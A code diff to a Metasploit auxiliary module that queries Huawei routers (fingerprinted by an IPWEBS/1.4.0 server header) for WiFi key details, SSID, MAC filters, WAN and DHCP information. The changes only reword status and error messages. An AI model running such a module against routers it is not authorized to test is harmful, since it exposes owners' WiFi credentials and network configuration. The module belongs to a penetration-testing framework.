@@ -93,12 +93,11 @@ class Metasploit3 < Msf::Auxiliary
     get_router_dhcp_info
     print_line('')
     get_wifi_info
-    print_line('')
   end
 
   def get_wifi_info
 
-    print_status('Now trying to get WiFi Key details...')
+    print_status("#{peer} - Getting WiFi Key details...")
     res = send_request_raw(
       {
         'method'  => 'GET',
@@ -112,7 +111,7 @@ class Metasploit3 < Msf::Auxiliary
     resp_body = res.body.to_s
     log = ''
 
-    print_status('WiFi Key Details')
+    print_status("WiFi Key Details")
 
     wifi_ssid = get_router_ssid
     if wifi_ssid
@@ -137,7 +136,7 @@ class Metasploit3 < Msf::Auxiliary
 
   def get_router_info
 
-    print_status("Attempting to connect to #{rhost} to gather basic device information...")
+    print_status("#{peer} - Gathering basic device information...")
     res = send_request_raw(
       {
         'method'  => 'GET',
@@ -161,6 +160,8 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def get_router_ssid
+    print_status("#{peer} - Gathering device SSID...")
+
     res = send_request_raw(
       {
         'method'  => 'GET',
@@ -183,6 +184,7 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def get_router_mac_filter_info
+    print_status("#{peer} - Gathering MAC filters...")
     res = send_request_raw(
       {
         'method'  => 'GET',
@@ -213,6 +215,7 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def get_router_wan_info
+    print_status("#{peer} - Gathering WAN information...")
     res = send_request_raw(
       {
         'method'  => 'GET',
@@ -236,7 +239,7 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def get_router_dhcp_info
-
+    print_status("#{peer} - Gathering DHCP information...")
     res = send_request_raw(
       {
         'method'  => 'GET',
@@ -272,19 +275,19 @@ class Metasploit3 < Msf::Auxiliary
   def is_target?(res)
     #check whether we got any response from server and proceed.
     unless res
-      print_error('Failed to get any response from server.')
+      print_error("#{peer} - Failed to get any response from server")
       return false
     end
 
     #Is it a HTTP OK
     unless res.code == 200
-      print_error('Did not get HTTP 200, URL was not found.')
+      print_error("#{peer} - Did not get HTTP 200, URL was not found")
       return false
     end
 
     #Check to verify server reported is a Huawei router
     unless res.headers['Server'].match(/IPWEBS\/1.4.0/i)
-      print_error('Target doesn\'t seem to be a Huawei router')
+      print_error("#{peer} - Target doesn't seem to be a Huawei router")
       return false
     end
 
